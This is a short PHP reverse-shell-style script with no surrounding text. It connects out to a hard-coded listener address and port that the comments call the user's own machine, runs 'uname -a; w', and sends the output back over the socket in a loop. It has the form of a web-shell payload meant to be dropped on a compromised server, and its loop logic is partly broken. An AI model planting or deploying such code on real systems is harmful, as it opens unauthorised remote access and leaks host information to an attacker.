<?php
$ip = '172.20.10.3';  // Your machine's IP address
$port = 4444;         // The port you are listening on
$shell = 'uname -a; w';
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    echo "$errstr ($errno)\n";
} else {
    while (1) {
        exec($shell . ' 2>&1', $output);
        fputs($sock, implode("\n", $output) . "\n");
        while ($buffer = fgets($sock)) {
            echo $buffer;
            if (strpos($buffer, 'exit') !== false) {
                break;
            }
        }
    }
    fclose($sock);
}
?>